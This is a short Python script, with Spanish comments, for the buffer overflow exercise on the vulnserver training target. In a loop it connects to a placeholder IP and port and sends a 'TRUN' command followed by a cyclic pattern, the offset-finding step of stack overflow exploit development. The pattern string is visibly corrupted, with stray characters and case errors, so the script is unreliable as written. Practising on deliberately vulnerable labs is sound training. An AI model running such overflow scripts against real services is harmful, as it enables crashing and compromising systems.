import sys, socket

#Este script esta diseñado para vulnserver

payload="AaØAa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9AbeAb1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9ACØACIAC2AC3AC4Ac5AC6AC7Ac8Ac9AdeAd1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9AeCAe1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9AfØAf1Af2Af3Af4Af5Af6Af7Af8Af9AgØAg" #Aqui se colocan los caracteres generados por el pattern_Create de metasploit

ip="10.0.0.0" #Cambia la direccion IP a la que necesites
port=5555 #Cambia el puerto al que necesites

while True:
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            
            s.send(bytes("TRUN /.:/" + payload,"latin-1")) #El string de TRUN puedes cambiarlo a otro comando si quieres
            s.close()
          
        
        except:
                print("Error conectando al servidor")
                sys.exit(0)